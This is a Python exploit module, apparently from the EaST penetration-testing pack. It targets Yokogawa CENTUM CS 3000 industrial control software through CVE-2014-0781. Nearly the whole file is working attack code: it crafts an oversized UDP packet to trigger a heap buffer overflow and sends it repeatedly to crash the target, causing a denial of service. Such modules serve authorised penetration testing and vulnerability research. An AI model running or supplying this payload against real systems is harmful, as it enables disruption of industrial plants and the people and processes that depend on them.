#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution
import sys
import time
import socket
import struct

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_Yokogawa_CENTUM_DoS"
INFO['DESCRIPTION'] = "Yokogawa CENTUM CS 3000 Remote Denial of Service"
INFO['VENDOR'] = "http://www.yokogawa.com/"
INFO["CVE Name"] = "CVE-2014-0781"
INFO["NOTES"] = """
Yokogawa CENTUM CS3000 is prone to a heap-based buffer-overflow vulnerability. 
Successful exploits will allow attackers to crash the affected application,
resulting in a denial-of-service condition. 
Yokogawa CENTUM CS3000 R3.08.50 is vulnerable; other versions may
also be affected.

Tested on: Yokogawa CENTUM CS 3000
"""

INFO['CHANGELOG'] = "18 Jan 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "192.168.1.110"
OPTIONS["PORT"] = 80


class exploit(Sploit):
    def __init__(self, host='192.168.1.110', port=80, logger=None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        return

    def makesploit(self):
        buff = struct.pack('<L',1024)
        buff += "ABCD"
        buff += "SOURCE\x00\x00" 
        buff += "\x00" * 8
        buff += "B" * (1024 - len(buff))
        return buff

    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        t=0
        while(t<=10):
            pkt=self.makesploit()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
                s.sendto(pkt, (self.host, self.port))
            except:
                pass
            t=t+1    
        self.log("Finished this exploit")
        self.finish(True)

if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()